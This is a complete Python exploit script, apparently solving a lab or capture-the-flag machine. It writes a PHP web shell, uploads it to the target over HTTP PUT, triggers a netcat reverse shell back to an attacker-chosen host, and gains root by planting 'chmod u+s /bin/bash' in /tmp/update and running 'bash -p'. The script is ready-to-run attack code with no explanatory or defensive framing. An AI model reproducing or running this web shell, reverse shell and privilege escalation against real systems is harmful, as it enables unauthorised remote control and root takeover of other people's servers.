#!/usr/bin/python3
with open('shell.php', 'w') as f1:
  f1.write('<?php if(isset($_REQUEST[\'cmd\'])){ echo "<pre>".shell_exec($_REQUEST[\'cmd\'])."</pre>" ;}; ?>')

import requests, threading, time
from os import *
from pwn import *

os.system(f'curl -s -X PUT -H "Expect: " {sys.argv[1]}/test/shell.php -d@./shell.php > /dev/null')

def cmd():
	os.system(f"curl http://{sys.argv[1]}/test/shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20{sys.argv[2]}%20443%20%3E%2Ftmp%2Ff")

threading.Thread(target=cmd).start()
shell = listen(443, timeout=20).wait_for_connection()
shell.sendline(b"script /dev/null -c sh")
time.sleep(1)
shell.sendline(b"export TERM=xterm; export SHELL=bash")
shell.sendline(b"echo 'chmod u+s /bin/bash' > /tmp/update")
shell.sendline(b"chmod 777 /tmp/update")
time.sleep(45)
shell.sendline(b"bash -p")
shell.sendline(b"clear; echo -n '$ Logged in as: '; whoami")
shell.interactive()
